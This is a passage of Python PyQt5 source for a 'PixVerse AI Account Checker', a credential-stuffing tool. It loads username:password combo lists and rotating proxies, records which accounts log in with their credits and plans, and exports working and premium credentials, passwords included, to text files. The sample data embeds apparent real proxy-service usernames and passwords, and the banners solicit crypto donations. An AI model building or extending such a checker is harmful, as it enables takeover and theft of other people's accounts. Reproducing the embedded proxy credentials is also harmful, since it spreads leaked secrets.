        save_logs_btn = QPushButton("📄 Save Logs")
        save_logs_btn.setObjectName("actionButton")
        save_logs_btn.clicked.connect(self.save_logs)
        action_layout2.addWidget(save_logs_btn)
        
        test_account_btn = QPushButton("🎬 Test Account")
        test_account_btn.setObjectName("actionButton")
        test_account_btn.clicked.connect(self.test_selected_account)
        action_layout2.addWidget(test_account_btn)
        
        export_csv_btn = QPushButton("📊 Export CSV")
        export_csv_btn.setObjectName("actionButton")
        export_csv_btn.clicked.connect(self.export_csv)
        action_layout2.addWidget(export_csv_btn)
        
        right_layout.addLayout(action_layout2)
        
        splitter.addWidget(right_widget)
        
        # Set initial sizes
        splitter.setSizes([600, 1000])
        
        main_layout.addWidget(splitter)
        
        # Status bar
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        
        self.combo_count_label = QLabel("🎬 AI Accounts: 0")
        self.combo_count_label.setObjectName("statusBarLabel")
        self.status_bar.addWidget(self.combo_count_label)
        
        self.proxy_count_label = QLabel("🌐 Proxies: 0")
        self.proxy_count_label.setObjectName("statusBarLabel")
        self.status_bar.addPermanentWidget(self.proxy_count_label)
        
        self.valid_count_label = QLabel("✅ Valid: 0")
        self.valid_count_label.setObjectName("statusBarLabel")
        self.status_bar.addPermanentWidget(self.valid_count_label)
        
        self.premium_count_label = QLabel("💎 Premium: 0")
        self.premium_count_label.setObjectName("statusBarLabel")
        self.status_bar.addPermanentWidget(self.premium_count_label)
        
        # Set minimum sizes
        self.setMinimumSize(1400, 900)
        
        # Load sample data
        self.load_sample_data()
    
    def get_stylesheet(self):
        """Get stylesheet based on AI Video Creation Theme"""
        return """
        /* Main window */
        QMainWindow {
            background-color: #0A0A2A;
            border: 3px solid #8A2BE2;
            border-radius: 10px;
        }
        
        /* Header */
        #headerWidget {
            background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                stop:0 #8A2BE2, stop:0.5 #FF69B4, stop:1 #00FFFF);
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 20px;
        }
        
        #mainTitle {
            color: #FFFFFF;
            font-size: 32px;
            font-weight: bold;
            font-family: 'Segoe UI', 'Arial Black', sans-serif;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
        }
        
        #subTitle {
            color: #FFFFFF;
            font-size: 16px;
            font-weight: bold;
            font-family: 'Segoe UI', sans-serif;
            opacity: 0.9;
        }
        
        /* Panels */
        #leftPanel, #rightPanel {
            background-color: rgba(10, 10, 42, 0.8);
            border-radius: 15px;
            padding: 15px;
        }
        
        /* Group boxes */
        QGroupBox {
            border: 2px solid #8A2BE2;
            border-radius: 12px;
            margin-top: 10px;
            padding-top: 15px;
            color: #00FFFF;
            font-weight: bold;
            font-size: 14px;
            background-color: rgba(20, 20, 60, 0.6);
            font-family: 'Segoe UI', sans-serif;
        }
        
        QGroupBox::title {
            subcontrol-origin: margin;
            subcontrol-position: top left;
            padding: 0 15px;
            background-color: #0A0A2A;
        }
        
        /* Labels */
        QLabel {
            color: #E0E0FF;
            font-size: 13px;
            font-family: 'Segoe UI', sans-serif;
        }
        
        #timerLabel, #statusLabel, #speedLabel, #workersLabel {
            color: #00FFFF;
            font-weight: bold;
            font-size: 13px;
        }
        
        #inputLabel {
            color: #FF69B4;
            font-weight: bold;
            font-size: 13px;
            margin-bottom: 5px;
        }
        
        #progressLabel, #etaLabel {
            color: #8A2BE2;
            font-weight: bold;
            font-size: 13px;
        }
        
        #statusBarLabel {
            color: #00FFFF;
            font-weight: bold;
            font-size: 12px;
            padding: 0 10px;
        }
        
        /* Buttons */
        QPushButton {
            background-color: rgba(138, 43, 226, 0.3);
            border: 2px solid #8A2BE2;
            border-radius: 8px;
            padding: 10px 20px;
            color: #FFFFFF;
            font-weight: bold;
            font-size: 13px;
            font-family: 'Segoe UI', sans-serif;
            min-height: 35px;
        }
        
        QPushButton:hover {
            background-color: rgba(138, 43, 226, 0.7);
            border-color: #FF69B4;
            color: #FFFFFF;
        }
        
        QPushButton:pressed {
            background-color: rgba(255, 105, 180, 0.8);
            border-color: #00FFFF;
        }
        
        QPushButton:disabled {
            background-color: #333366;
            border-color: #666699;
            color: #9999CC;
        }
        
        #startButton {
            background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                stop:0 #00FFAA, stop:1 #00CC88);
            border: 2px solid #00FFAA;
            color: #0A0A2A;
            font-size: 16px;
            font-weight: bold;
        }
        
        #startButton:hover {
            background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                stop:0 #00FFCC, stop:1 #00EEAA);
            border-color: #00FFFF;
        }
        
        #stopButton {
            background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                stop:0 #FF4444, stop:1 #CC3333);
            border: 2px solid #FF4444;
            color: #FFFFFF;
            font-size: 16px;
            font-weight: bold;
        }
        
        #stopButton:hover {
            background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                stop:0 #FF6666, stop:1 #FF5555);
            border-color: #FF69B4;
        }
        
        #fileButton, #actionButton {
            background-color: rgba(255, 105, 180, 0.3);
            border: 2px solid #FF69B4;
            font-size: 12px;
            padding: 8px 15px;
        }
        
        #fileButton:hover, #actionButton:hover {
            background-color: rgba(255, 105, 180, 0.7);
            border-color: #8A2BE2;
        }
        
        /* Text inputs */
        QPlainTextEdit, QTextEdit {
            background-color: rgba(20, 20, 50, 0.8);
            border: 2px solid #00FFFF;
            border-radius: 8px;
            padding: 10px;
            color: #E0E0FF;
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 12px;
            selection-background-color: #8A2BE2;
        }
        
        #comboInput, #proxyInput {
            border: 2px solid #8A2BE2;
        }
        
        #validOutput {
            border: 2px solid #00FFAA;
            color: #00FFAA;
        }
        
        #premiumOutput {
            border: 2px solid #FF69B4;
            color: #FF69B4;
        }
        
        #logOutput {
            border: 2px solid #00FFFF;
            color: #E0E0FF;
        }
        
        /* Progress bar */
        #progressBar {
            border: 2px solid #8A2BE2;
            border-radius: 10px;
            text-align: center;
            color: #FFFFFF;
            font-weight: bold;
            font-size: 13px;
            height: 28px;
            background-color: rgba(20, 20, 50, 0.8);
        }
        
        #progressBar::chunk {
            background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                stop:0 #8A2BE2, stop:0.5 #FF69B4, stop:1 #00FFFF);
            border-radius: 8px;
        }
        
        /* Table widget */
        #resultsTable {
            background-color: rgba(20, 20, 50, 0.8);
            border: 2px solid #00FFFF;
            border-radius: 10px;
            color: #E0E0FF;
            font-size: 12px;
            font-family: 'Consolas', 'Monaco', monospace;
            gridline-color: #8A2BE2;
        }
        
        #resultsTable::item {
            padding: 8px;
            border-bottom: 1px solid rgba(138, 43, 226, 0.3);
        }
        
        #resultsTable::item:selected {
            background-color: #8A2BE2;
            color: #FFFFFF;
        }
        
        QHeaderView::section {
            background-color: #8A2BE2;
            color: #FFFFFF;
            padding: 10px;
            border: 1px solid #00FFFF;
            font-weight: bold;
            font-size: 12px;
            font-family: 'Segoe UI', sans-serif;
        }
        
        /* Tab widget */
        #resultsTabs::pane {
            border: 2px solid #8A2BE2;
            border-radius: 12px;
            background-color: rgba(20, 20, 50, 0.8);
        }
        
        QTabBar::tab {
            background-color: rgba(138, 43, 226, 0.3);
            border: 2px solid #8A2BE2;
            border-bottom: none;
            border-top-left-radius: 10px;
            border-top-right-radius: 10px;
            padding: 12px 20px;
            color: #E0E0FF;
            font-size: 13px;
            font-weight: bold;
            font-family: 'Segoe UI', sans-serif;
            margin-right: 5px;
        }
        
        QTabBar::tab:selected {
            background-color: #8A2BE2;
            color: #FFFFFF;
        }
        
        QTabBar::tab:hover {
            background-color: rgba(255, 105, 180, 0.5);
            color: #FFFFFF;
        }
        
        /* Spin box */
        #settingsSpin {
            background-color: rgba(20, 20, 50, 0.8);
            border: 2px solid #00FFFF;
            border-radius: 6px;
            padding: 6px;
            color: #E0E0FF;
            min-width: 80px;
            font-size: 12px;
            font-family: 'Segoe UI', sans-serif;
        }
        
        QSpinBox::up-button, QSpinBox::down-button {
            background-color: #8A2BE2;
            border: 1px solid #00FFFF;
            width: 20px;
            border-radius: 3px;
        }
        
        QSpinBox::up-arrow, QSpinBox::down-arrow {
            border: none;
            width: 8px;
            height: 8px;
        }
        
        /* Combo box */
        #settingsCombo {
            background-color: rgba(20, 20, 50, 0.8);
            border: 2px solid #00FFFF;
            border-radius: 6px;
            padding: 6px;
            color: #E0E0FF;
            min-width: 120px;
            font-size: 12px;
            font-family: 'Segoe UI', sans-serif;
        }
        
        #settingsCombo::drop-down {
            border: none;
            width: 25px;
        }
        
        #settingsCombo QAbstractItemView {
            background-color: rgba(20, 20, 50, 0.9);
            border: 2px solid #8A2BE2;
            color: #E0E0FF;
            selection-background-color: #8A2BE2;
            selection-color: #FFFFFF;
        }
        
        /* Status bar */
        QStatusBar {
            background-color: rgba(10, 10, 42, 0.9);
            color: #00FFFF;
            font-size: 12px;
            font-weight: bold;
            padding: 10px;
            border-top: 2px solid #8A2BE2;
        }
        
        /* Scroll bars */
        QScrollBar:vertical {
            border: 2px solid #8A2BE2;
            background: rgba(20, 20, 50, 0.8);
            width: 16px;
            margin: 20px 0 20px 0;
            border-radius: 8px;
        }
        
        QScrollBar::handle:vertical {
            background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                stop:0 #8A2BE2, stop:1 #FF69B4);
            min-height: 30px;
            border-radius: 8px;
        }
        
        QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {
            border: 2px solid #8A2BE2;
            background: #8A2BE2;
            height: 20px;
            subcontrol-position: bottom;
            subcontrol-origin: margin;
            border-radius: 8px;
        }
        
        QScrollBar:horizontal {
            border: 2px solid #8A2BE2;
            background: rgba(20, 20, 50, 0.8);
            height: 16px;
            margin: 0 20px 0 20px;
            border-radius: 8px;
        }
        
        QScrollBar::handle:horizontal {
            background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                stop:0 #8A2BE2, stop:1 #FF69B4);
            min-width: 30px;
            border-radius: 8px;
        }
        """
    
    def load_settings(self):
        """Load settings from config and show welcome message"""
        welcome_message = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                        🎬 PIXVERSE AI ACCOUNT CHECKER v2.0                    ║
║                          Created by @allicheamine2                            ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  ⚠️  IMPORTANT INFORMATION:                                                   ║
║  • This tool extracts credits from PixVerse AI video creation platform       ║
║  • Daily credits + Package credits = Total available credits                 ║
║  • Basic Plan = FREE account (no expiry date)                               ║
║  • Results sorted by total credits (highest first)                          ║
║                                                                              ║
║  💰 HELP A SICK DEVELOPER:                                                   ║
║  I'm struggling with serious health issues. If this tool helps you,          ║
║  please consider supporting me:                                              ║
║                                                                              ║
║  💳 Binance ID: 801774085                                                    ║
║  📮 USDT (TRX): TBeHkEpdtDqzzyvtWgMgiR1bhS7LDpi19L                          ║
║                                                                              ║
║  Every donation helps me pay for medical bills and keep creating tools.      ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""
        
        for line in welcome_message.split('\n'):
            self.log_output.appendPlainText(line)
        
        # Log configuration info
        self.log("🎬 PixVerse AI Account Checker v2.0 loaded successfully!")
        self.log("⚡ Features: Credit Extraction | Plan Detection | Multi-threading")
        self.log("🌐 Proxy Support: All formats including your provided proxies")
        self.log("📊 Results: Sorted by total credits (daily + package)")
        self.log("💎 NEW: Export Premium feature added!")
        self.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    def load_sample_data(self):
        """Load sample data for testing"""
        sample_accounts = """ai_user1:password123
ai_creator2:securepass456
video_maker3:animations789"""
        
        sample_proxies = """px052001.pointtoserver.com:10780:purevpn0s9889572:jx5q0xao
px470108.pointtoserver.com:10780:reseller3270s320237:7Grp9Gki
px121102.pointtoserver.com:10780:purevpn0s13918278:vXhSspFRa7@}
px480301.pointtoserver.com:10780:purevpn0s14057303:T532KWoMu1C5xj
px400501.pointtoserver.com:10780:purevpn0s4853248:1glf5qesa0ov
px340403.pointtoserver.com:10780:purevpn0s9889572:jx5q0xao
px490401.pointtoserver.com:10780:purevpn0s9889572:jx5q0xao
px043005.pointtoserver.com:10780:purevpn0s17886506:yC1aK9QHXn3^
px870303.pointtoserver.com:10780:purevpn0s14057303:T532KWoMu1C5xj
px320704.pointtoserver.com:10780:reseller3270s320237:7Grp9Gki
px320702.pointtoserver.com:10780:purevpn0s17886506:yC1aK9QHXn3^"""
        
        self.combo_input.setPlainText(sample_accounts)
        self.proxy_input.setPlainText(sample_proxies)
        self.update_counts()
    
    def setup_connections(self):
        """Setup signal connections"""
        self.update_timer.timeout.connect(self.update_display)
        self.update_timer.start(250)
        
        self.elapsed_timer.timeout.connect(self.update_timer_display)
        self.elapsed_timer.start(1000)
        
        # Update counts when text changes
        self.combo_input.textChanged.connect(self.update_counts)
        self.proxy_input.textChanged.connect(self.update_counts)
        
        # Connect sort combo
        self.sort_combo.currentTextChanged.connect(self.sort_results)
    
    def update_counts(self):
        """Update combo and proxy counts"""
        combos = [c.strip() for c in self.combo_input.toPlainText().strip().splitlines() if c.strip()]
        proxies = [p.strip() for p in self.proxy_input.toPlainText().strip().splitlines() if p.strip()]
        
        self.combo_count_label.setText(f"🎬 AI Accounts: {len(combos)}")
        self.proxy_count_label.setText(f"🌐 Proxies: {len(proxies)}")
    
    def update_display(self):
        """Update all display elements"""
        try:
            stats = self.checker.get_stats()
            
            # Update stats
            self.stat_labels['valid'].setText(str(stats['valid']))
            self.stat_labels['premium'].setText(str(stats['premium']))
            self.stat_labels['free'].setText(str(stats['free']))
            self.stat_labels['failed'].setText(str(stats['failed']))
            self.stat_labels['checked'].setText(str(stats['checked']))
            self.stat_labels['credits'].setText(str(stats['total_credits']))
            
            # Update CPM
            cpm = self.checker.get_cpm()
            self.stat_labels['cpm'].setText(str(cpm))
            self.speed_label.setText(f"⚡ CPM: {cpm}")
            
            # Update average response time
            avg_time = stats['avg_response_time']
            self.stat_labels['avg_time'].setText(f"{avg_time:.2f}s")
            
            # Update workers
            self.workers_label.setText(f"👷 Workers: {stats['active_workers']}")
            
            # Update progress
            checked, total, percentage = self.checker.get_progress()
            
            # Force 100% when checking is complete
            if not self.checker.is_running and checked >= total and total > 0:
                checked = total
                percentage = 100.0
            
            self.progress_bar.setMaximum(total)
            self.progress_bar.setValue(checked)
            self.progress_label.setText(f"Progress: {checked}/{total} ({percentage:.1f}%)")
            
            # Update ETA
            if cpm > 0 and total > 0 and checked > 0 and self.checker.is_running:
                remaining = total - checked
                eta_seconds = (remaining / cpm) * 60 if cpm > 0 else 0
                eta_str = str(timedelta(seconds=int(eta_seconds)))
                self.eta_label.setText(f"ETA: {eta_str}")
            else:
                self.eta_label.setText("ETA: --:--")
            
            # Update status
            if self.checker.is_running:
                elapsed = self.checker.get_elapsed_time()
                self.status_label.setText(f"🟢 RUNNING - {elapsed}")
                self.status_label.setStyleSheet("color: #00FFAA; font-weight: bold; font-size: 13px;")
            else:
                if stats['checked'] > 0:
                    self.status_label.setText("🟡 COMPLETED")
                    self.status_label.setStyleSheet("color: #FF69B4; font-weight: bold; font-size: 13px;")
                    
                    # Ensure progress bar is at 100%
                    if total > 0 and checked == total:
                        self.progress_bar.setValue(total)
                else:
                    self.status_label.setText("🟢 READY")
                    self.status_label.setStyleSheet("color: #00FFFF; font-weight: bold; font-size: 13px;")
            
            # Update status bar counts
            self.valid_count_label.setText(f"✅ Valid: {stats['valid']}")
            self.premium_count_label.setText(f"💎 Premium: {stats['premium']}")
            
            # Process results queue
            self.process_results_queue()
            
            # Process log queue
            self.process_log_queue()
            
        except Exception as e:
            print(f"Update error: {e}")
    
    def update_timer_display(self):
        """Update timer display"""
        if self.checker.is_running:
            elapsed = self.checker.get_elapsed_time()
            self.timer_label.setText(f"⏱️ Time: {elapsed}")
    
    def process_results_queue(self):
        """Process results from queue"""
        try:
            results_added = False
            while not self.checker.results_queue.empty():
                account = self.checker.results_queue.get_nowait()
                
                # Add to results table
                self.add_account_to_table(account)
                
                # Add to appropriate output tab
                if account.status == "Valid":
                    self.add_valid_to_list(account)
                    
                    if not account.is_free:
                        self.add_premium_to_list(account)
                
                results_added = True
            
            # Sort results if new ones were added
            if results_added:
                self.sort_results()
                
        except Exception as e:
            self.log(f"❌ Error processing results: {str(e)}")
    
    def add_account_to_table(self, account: PixverseAccount):
        """Add account to results table"""
        row = self.results_table.rowCount()
        self.results_table.insertRow(row)
        
        # Time
        time_item = QTableWidgetItem(account.last_checked)
        time_item.setForeground(QColor("#00FFFF"))
        self.results_table.setItem(row, 0, time_item)
        
        # Status
        if account.status == "Valid":
            status_text = "✅ VALID"
            color = "#00FFAA"
        elif account.status == "Failed":
            status_text = "❌ FAILED"
            color = "#FF4444"
        elif account.status == "Error":
            status_text = "⚠️ ERROR"
            color = "#FF9966"
        else:
            status_text = account.status
            color = "#FFFF00"
        
        status_item = QTableWidgetItem(status_text)
        status_item.setForeground(QColor(color))
        self.results_table.setItem(row, 1, status_item)
        
        # Username
        username_item = QTableWidgetItem(account.username)
        username_item.setForeground(QColor("#E0E0FF"))
        self.results_table.setItem(row, 2, username_item)
        
        # Plan Name
        plan_item = QTableWidgetItem(account.plan_name)
        if account.plan_type == "Premium":
            plan_item.setForeground(QColor("#FF69B4"))
        else:
            plan_item.setForeground(QColor("#8A2BE2"))
        self.results_table.setItem(row, 3, plan_item)
        
        # Plan Type
        type_item = QTableWidgetItem(account.plan_type)
        if account.plan_type == "Premium":
            type_item.setForeground(QColor("#FF69B4"))
        else:
            type_item.setForeground(QColor("#8A2BE2"))
        self.results_table.setItem(row, 4, type_item)
        
        # Daily Credits
        daily_item = QTableWidgetItem(str(account.credit_daily))
        daily_item.setForeground(QColor("#00FFFF" if account.credit_daily > 0 else "#6666FF"))
        daily_item.setTextAlignment(Qt.AlignCenter)
        self.results_table.setItem(row, 5, daily_item)
        
        # Package Credits
        package_item = QTableWidgetItem(str(account.credit_package))
        package_item.setForeground(QColor("#FF69B4" if account.credit_package > 0 else "#6666FF"))
        package_item.setTextAlignment(Qt.AlignCenter)
        self.results_table.setItem(row, 6, package_item)
        
        # Total Credits
        total_item = QTableWidgetItem(str(account.total_credits))
        if account.total_credits >= 150:
            total_item.setForeground(QColor("#FF69B4"))
            total_item.setFont(QFont("Consolas", 11, QFont.Bold))
        elif account.total_credits >= 100:
            total_item.setForeground(QColor("#00FFAA"))
            total_item.setFont(QFont("Consolas", 11, QFont.Bold))
        elif account.total_credits >= 50:
            total_item.setForeground(QColor("#00FFFF"))
        else:
            total_item.setForeground(QColor("#8A2BE2"))
        total_item.setTextAlignment(Qt.AlignCenter)
        self.results_table.setItem(row, 7, total_item)
        
        # Expiry Date
        expiry_text = account.expiry_date
        if expiry_text == '0001-01-01T00:00:00Z' or expiry_text == 'N/A':
            expiry_text = "🎬 NO EXPIRY"
            color = "#8A2BE2"
        else:
            try:
                # Parse and format date
                expiry_date = datetime.strptime(expiry_text, "%Y-%m-%dT%H:%M:%SZ")
                expiry_text = expiry_date.strftime("%Y-%m-%d")
                days_until = (expiry_date - datetime.now()).days
                if days_until > 30:
                    color = "#00FFAA"
                elif days_until > 7:
                    color = "#00FFFF"
                else:
                    color = "#FF9966"
                expiry_text = f"{expiry_text} ({days_until}d)"
            except:
                color = "#FF4444"
        
        expiry_item = QTableWidgetItem(expiry_text)
        expiry_item.setForeground(QColor(color))
        self.results_table.setItem(row, 8, expiry_item)
        
        # Albums
        album_item = QTableWidgetItem(str(account.album_num))
        album_item.setForeground(QColor("#8A2BE2" if account.album_num > 0 else "#6666FF"))
        album_item.setTextAlignment(Qt.AlignCenter)
        self.results_table.setItem(row, 9, album_item)
        
        # Qualities
        qualities_item = QTableWidgetItem(', '.join(account.qualities) if account.qualities else "N/A")
        qualities_item.setForeground(QColor("#00FFFF"))
        self.results_table.setItem(row, 10, qualities_item)
        
        # High Quality Times
        hq_item = QTableWidgetItem(str(account.high_quality_times))
        hq_item.setForeground(QColor("#FF69B4" if account.high_quality_times > 0 else "#6666FF"))
        hq_item.setTextAlignment(Qt.AlignCenter)
        self.results_table.setItem(row, 11, hq_item)
        
        # Story Free Times
        story_item = QTableWidgetItem(str(account.story_free_times))
        story_item.setForeground(QColor("#8A2BE2" if account.story_free_times > 0 else "#6666FF"))
        story_item.setTextAlignment(Qt.AlignCenter)
        self.results_table.setItem(row, 12, story_item)
        
        # Response Time
        response_item = QTableWidgetItem(f"{account.response_time:.2f}s")
        if account.response_time < 1:
            response_item.setForeground(QColor("#00FFAA"))
        elif account.response_time < 3:
            response_item.setForeground(QColor("#00FFFF"))
        else:
            response_item.setForeground(QColor("#FF9966"))
        response_item.setTextAlignment(Qt.AlignCenter)
        self.results_table.setItem(row, 13, response_item)
        
        # Is Free
        free_item = QTableWidgetItem("🎬 FREE" if account.is_free else "💎 PREMIUM")
        if account.is_free:
            free_item.setForeground(QColor("#8A2BE2"))
        else:
            free_item.setForeground(QColor("#FF69B4"))
        free_item.setTextAlignment(Qt.AlignCenter)
        self.results_table.setItem(row, 14, free_item)
        
        # Error
        error_item = QTableWidgetItem(account.error or "No errors")
        if account.error:
            error_item.setForeground(QColor("#FF4444"))
        self.results_table.setItem(row, 15, error_item)
        
        # Auto-scroll
        self.results_table.scrollToBottom()
    
    def add_valid_to_list(self, account: PixverseAccount):
        """Add valid account to valid list"""
        formatted = f"[{account.last_checked}] {account.username}:{account.password} | Plan: {account.plan_name} ({account.plan_type}) | Credits: {account.total_credits} (D:{account.credit_daily}+P:{account.credit_package}) | Albums: {account.album_num} | HQ: {account.high_quality_times} | Story: {account.story_free_times} | Expiry: {account.expiry_date}"
        self.valid_output.appendPlainText(formatted)
        
        # Auto-scroll
        scrollbar = self.valid_output.verticalScrollBar()
        scrollbar.setValue(scrollbar.maximum())
    
    def add_premium_to_list(self, account: PixverseAccount):
        """Add premium account to premium list"""
        formatted = f"[{account.last_checked}] {account.username}:{account.password} | Plan: {account.plan_name} | Credits: {account.total_credits} (D:{account.credit_daily}+P:{account.credit_package}) | Qualities: {', '.join(account.qualities)} | Expiry: {account.expiry_date}"
        self.premium_output.appendPlainText(formatted)
        
        # Auto-scroll
        scrollbar = self.premium_output.verticalScrollBar()
        scrollbar.setValue(scrollbar.maximum())
    
    def sort_results(self):
        """Sort results table based on selected criteria"""
        sort_by = self.sort_combo.currentText()
        
        if sort_by == "Total Credits (High to Low)":
            column = 7  # Total column
            order = Qt.DescendingOrder
        elif sort_by == "Total Credits (Low to High)":
            column = 7
            order = Qt.AscendingOrder
        elif sort_by == "Username":
            column = 2
            order = Qt.AscendingOrder
        elif sort_by == "Plan Type":
            column = 4
            order = Qt.DescendingOrder
        elif sort_by == "Response Time":
            column = 13
            order = Qt.AscendingOrder
        else:
            return
        
        self.results_table.sortItems(column, order)
    
    def process_log_queue(self):
        """Process log messages from queue"""
        try:
            while not self.checker.log_queue.empty():
                log_msg = self.checker.log_queue.get_nowait()
                timestamp = datetime.now().strftime("%H:%M:%S")
                self.log_output.appendPlainText(f"[{timestamp}] {log_msg}")
                
                # Auto-scroll
                scrollbar = self.log_output.verticalScrollBar()
                scrollbar.setValue(scrollbar.maximum())
                
        except Exception as e:
            print(f"Log processing error: {e}")
    
    def load_combos_file(self):
        """Load combos from file"""
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Open AI Accounts File", "", "Text Files (*.txt);;All Files (*)"
        )
        
        if file_path:
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    combos = f.read()
                    self.combo_input.setPlainText(combos)
                    self.update_counts()
                    self.log(f"✅ Loaded {len(combos.splitlines())} AI accounts from file")
            except Exception as e:
                self.log(f"❌ Error loading accounts: {str(e)}")
    
    def load_proxies_file(self):
        """Load proxies from file"""
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Open Proxies File", "", "Text Files (*.txt);;All Files (*)"
        )
        
        if file_path:
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    proxies = f.read()
                    self.proxy_input.setPlainText(proxies)
                    self.update_counts()
                    self.log(f"✅ Loaded {len(proxies.splitlines())} proxies from file")
            except Exception as e:
                self.log(f"❌ Error loading proxies: {str(e)}")
    
    def clear_inputs(self):
        """Clear all input fields"""
        self.combo_input.clear()
        self.proxy_input.clear()
        self.update_counts()
        self.log("🗑️ Cleared all inputs")
    
    def start_checking(self):
        """Start checking accounts"""
        # Get combos
        combo_text = self.combo_input.toPlainText().strip()
        if not combo_text:
            QMessageBox.warning(self, "Warning", "Please enter AI accounts!")
            return
        
        combos = [c.strip() for c in combo_text.splitlines() if c.strip()]
        
        if len(combos) == 0:
            QMessageBox.warning(self, "Warning", "No valid AI accounts found!")
            return
        
        # Get proxies
        proxy_text = self.proxy_input.toPlainText().strip()
        proxies = [p.strip() for p in proxy_text.splitlines() if p.strip()]
        
        # Clear previous results
        self.results_table.setRowCount(0)
        self.valid_output.clear()
        self.premium_output.clear()
        
        # Update global settings
        global REQUEST_TIMEOUT, MAX_RETRIES
        REQUEST_TIMEOUT = self.timeout_spin.value()
        MAX_RETRIES = self.retries_spin.value()
        
        # Start checking
        threads = self.threads_spin.value()
        
        if self.checker.start_checking(combos, proxies, threads):
            # Update UI
            self.start_btn.setEnabled(False)
            self.stop_btn.setEnabled(True)
            
            self.log(f"🎬 Started checking {len(combos)} AI accounts with {threads} threads")
            if proxies:
                self.log(f"🌐 Using {len(self.checker.proxies)} parsed proxies")
            else:
                self.log("ℹ️ Running without proxies")
            self.log(f"⚙️ Settings: Timeout={REQUEST_TIMEOUT}s, Retries={MAX_RETRIES}")
            
            # Reset timer
            self.timer_label.setText("⏱️ Time: 00:00:00")
            
            # Reset progress bar
            self.progress_bar.setValue(0)
        else:
            self.log("❌ Failed to start checking")
    
    def stop_checking(self):
        """Stop checking accounts"""
        self.checker.stop_checking()
        
        # Update UI
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        
        # Get final stats
        stats = self.checker.get_stats()
        elapsed = self.checker.get_elapsed_time()
        
        self.log(f"🟡 Checking stopped after {elapsed}")
        self.log(f"📊 Summary: {stats['valid']} valid, {stats['premium']} premium, {stats['free']} free, {stats['failed']} failed")
        self.log(f"💰 Total Credits Found: {stats['total_credits']}")
        
        # Force progress bar to 100%
        checked, total, percentage = self.checker.get_progress()
        if total > 0:
            self.progress_bar.setValue(total)
            self.progress_label.setText(f"Progress: {total}/{total} (100%)")
        
        # Update status
        self.status_label.setText("🟡 COMPLETED")
        self.status_label.setStyleSheet("color: #FF69B4; font-weight: bold; font-size: 13px;")
        
        # Show final message
        self.log("╔══════════════════════════════════════════════════════════════╗")
        self.log("║                    🎬 FINAL STATISTICS                       ║")
        self.log("╠══════════════════════════════════════════════════════════════╣")
        self.log(f"║ Total Accounts: {total:<10} Valid Accounts: {stats['valid']:<8}   ║")
        self.log(f"║ Premium Plans: {stats['premium']:<11} Free Plans: {stats['free']:<10} ║")
        self.log(f"║ Total Credits: {stats['total_credits']:<10} Average Time: {self.checker.stats['avg_response_time']:.2f}s ║")
        self.log("╚══════════════════════════════════════════════════════════════╝")
        self.log("")
        self.log("💖 Thank you for using PixVerse AI Account Checker!")
        self.log("👨‍💻 Created by @allicheamine2 - Alliche Tools")
        self.log("💰 If this helped you, please consider donating:")
        self.log("   💳 Binance ID: 801774085")
        self.log("   📮 USDT (TRX): TBeHkEpdtDqzzyvtWgMgiR1bhS7LDpi19L")
    
    def export_valid(self):
        """Export valid accounts to file"""
        valid_text = self.valid_output.toPlainText()
        if not valid_text.strip():
            QMessageBox.warning(self, "Warning", "No valid accounts to export!")
            return
        
        file_path, _ = QFileDialog.getSaveFileName(
            self, "Save Valid AI Accounts", "pixverse_valid_accounts.txt", "Text Files (*.txt);;All Files (*)"
        )
        
        if file_path:
            try:
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write("🎬 PIXVERSE VALID ACCOUNTS v2.0 🎬\n")
                    f.write("Created by: @allicheamine2 | Alliche Tools\n")
                    f.write("💰 If this helped you, please consider donating to the sick developer!\n")
                    f.write("💳 Binance ID: 801774085 | TRX: TBeHkEpdtDqzzyvtWgMgiR1bhS7LDpi19L\n")
                    f.write("=" * 80 + "\n")
                    f.write("Generated: " + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n")
                    f.write("=" * 80 + "\n\n")
                    f.write(valid_text)
                self.log(f"💾 Exported valid AI accounts to {file_path}")
            except Exception as e:
                self.log(f"❌ Error exporting: {str(e)}")
    
    def export_premium(self):
        """Export premium accounts to file"""
        premium_text = self.premium_output.toPlainText()
        if not premium_text.strip():
            QMessageBox.warning(self, "Warning", "No premium accounts to export!")
            return
        
        file_path, _ = QFileDialog.getSaveFileName(
            self, "Save Premium AI Accounts", "pixverse_premium_accounts.txt", "Text Files (*.txt);;All Files (*)"
        )
        
        if file_path:
            try:
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write("💎 PIXVERSE PREMIUM ACCOUNTS v2.0 💎\n")
                    f.write("Created by: @allicheamine2 | Alliche Tools\n")
                    f.write("💰 If this helped you, please consider donating to the sick developer!\n")
                    f.write("💳 Binance ID: 801774085 | TRX: TBeHkEpdtDqzzyvtWgMgiR1bhS7LDpi19L\n")
                    f.write("=" * 80 + "\n")
                    f.write("Generated: " + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n")
                    f.write("=" * 80 + "\n\n")
                    f.write("🎬 PREMIUM ACCOUNTS (Paid Plans with Credits) 🎬\n")
                    f.write("=" * 80 + "\n\n")
                    f.write(premium_text)
                self.log(f"💎 Exported premium AI accounts to {file_path}")
            except Exception as e:
                self.log(f"❌ Error exporting premium: {str(e)}")
    
    def copy_valid(self):
